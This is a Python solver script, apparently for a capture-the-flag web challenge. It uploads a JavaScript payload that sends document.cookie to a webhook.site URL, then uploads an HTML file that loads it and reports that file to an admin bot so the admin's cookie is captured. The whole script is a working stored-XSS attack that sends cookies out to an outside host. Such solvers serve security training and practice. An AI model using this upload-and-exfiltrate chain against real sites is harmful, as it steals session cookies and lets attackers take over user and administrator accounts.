import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, WebhookSite

import io

BASE_URL = "https://profile-v2.quoccacorp.com"

class Solver:
    def __init__(self):
        self.session = get_session()
        self.webhooksite = WebhookSite()

    def generate_file(self, file_content: str, filename: str):
        svg_file = io.BytesIO(file_content.encode())
        svg_file.name = filename
        return svg_file.name, svg_file

    def get_uploaded_file_path(self):
        from bs4 import BeautifulSoup
        response = self.session.get(BASE_URL)
        soup = BeautifulSoup(response.text, "html.parser")
        img_element = soup.find("img", class_="profile-pic", src=True)
        return img_element.get("src")

    def main(self):
        # Craft JS File
        JS_PAYLOAD = f'fetch(`{self.webhooksite.url}?q=${{document.cookie}}`);'
        js_filename, js_file = self.generate_file(JS_PAYLOAD, "profile_v2.js")

        # Upload JS File
        self.session.post(f"{BASE_URL}/profile", files={"file": (js_filename, js_file)})
        js_file_path = self.get_uploaded_file_path()

        # Craft HTML File
        HTML_PAYLOAD = f'<script src="{js_file_path}"></script>'
        html_filename, html_file = self.generate_file(HTML_PAYLOAD, "profile_v2.html")

        # Upload HTML File
        self.session.post(f"{BASE_URL}/profile", files={"file": (html_filename, html_file)})
        html_file_path = self.get_uploaded_file_path()

        # Report HTML File to Admin
        self.session.post(f"{BASE_URL}/report", data={"path": html_file_path})

        # Find flag in webhook.site
        self.webhooksite.find_flags()

if __name__ == "__main__":
    Solver().main()
